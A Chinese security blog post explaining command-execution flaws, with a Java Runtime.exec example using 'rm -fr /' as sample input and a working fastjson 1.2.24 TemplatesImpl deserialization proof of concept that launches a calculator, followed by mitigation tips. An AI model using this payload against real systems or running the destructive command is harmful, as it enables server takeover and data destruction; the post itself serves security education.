---
title: 命令执行漏洞
date: 2018-02-26
categories: ["security"]
---

命令执行漏洞是指攻击者可以随意执行系统命令。通常说的远程执行代码漏洞,都是此类型.

<!--more-->

### OS命令执行漏洞

任何语言基本上都可以调用系统命令。比如PHP的system,shell_exec,exec等等或者Java的Runtine.exec都是可以直接执行系统调用的。

举个简单的示例

```
public static void main(String[] args) throws IOException {
		
	if(args.length == 0){
		System.out.println("args is empty !");
	}
	
	String command = args[0];
	Runtime runtime = Runtime.getRuntime();
	Process process = runtime.exec(command);
	InputStreamReader isr = new InputStreamReader(process.getInputStream());
	BufferedReader br = new BufferedReader(isr);
	String line = null;
	while((line=br.readLine())!=null){
		System.out.println(line);
	}
	
	br.close();
}
```
上述代码打包以后,执行 java xxx.jar "rm -fr /",也就是传入的系统执行命令是删除服务器根目录.这是个很危险的操作.倘若类似的代码暴露在公网上面.有意者构造请求就能达到执行恶意命令的目的


### 框架执行漏洞

我们的代码一般是没有使用到runtime.exec , 但是我们经常是使用反射或者字节码相关的类,或者业务系统里面使用了相关的框架,当用户能在输入中构造出相关的执行类时便可以,通过构造出的执行类来达到执行自己恶意代码的目的.

2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。 具体地址是 https://github.com/alibaba/fastjson/wiki/security_update_20170315

这个漏洞的大概操作就是,写好一个带有Runtime.exec的类,然后在有用户输入的地方,注入该类的字节码,然后指定fastjson解析为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ,此目标类是jdk自带的,所以不需要依赖其他的包.下面来个例子


```
package com.lihongkun.demo.fastjson;

import java.io.IOException;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

@SuppressWarnings("restriction")
public class Command extends AbstractTranslet {

	public Command() throws IOException{
		Runtime.getRuntime().exec("calc");
	}
	
	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
		
	}

	public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
			throws TransletException {
	}
}

```

这是个很简单的执行类,我们要做的就是将他的字节码注入到待侵入系统使用了fastjson的地方.


```
package com.lihongkun.demo.fastjson;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Test {

	public static void main(String[] args) {
		
		String path = System.getProperty("user.dir")+File.separator+"target/classes/com/lihongkun/demo/fastjson/Command.class";
		String evilCode = readBytecode(path);
		
		final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String testJson = "{\"@type\":\"" + NASTY_CLASS + 
        		"\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{}}\n";
        JSON.parseObject(testJson, Object.class,Feature.SupportNonPublicField);
	}
	
	public static String readBytecode(String path){
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(path)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
	}
}
```

readBytecode 函数读出了Command类的字节码,并转换成base64,我们使用他来模拟用户的输入,最终放入evilCode,然后构造完整的json对象,也就是testJson.在实际的攻击中只需要往系统里面构造的几个字段即可.在执行了代码后确实是调出了windows的计算器,有兴趣的可以试试.这个侵入是比较巧的它需要业务系统使用了SupportNonPublicField参数.


类似的,struts2的漏洞曾经爆发过几次.它是由于其WEB输入参数使用了OGNL动态绑定到值对象,攻击者构造固定的参数,使其支持静态方法并且直接执行了Runtime的方法.struts2的这个漏洞危害显然是很巨大的,它不需要任何条件,只需要输入构造好的参数.


### 防范命令执行漏洞

- 不要使用这种危险的系统执行命令代码.如果没有使用就不会被利用.
- 非要使用的时候,在执行动态命令之前,一定要对用户输入的变量进行过滤,且对敏感字符进行转义.有输入的地方就可能存在漏洞
- 对于框架类型的,在业务上线前要做好充分测试,如果真有漏洞爆发,要及时进行处理,关注官方的修复情况.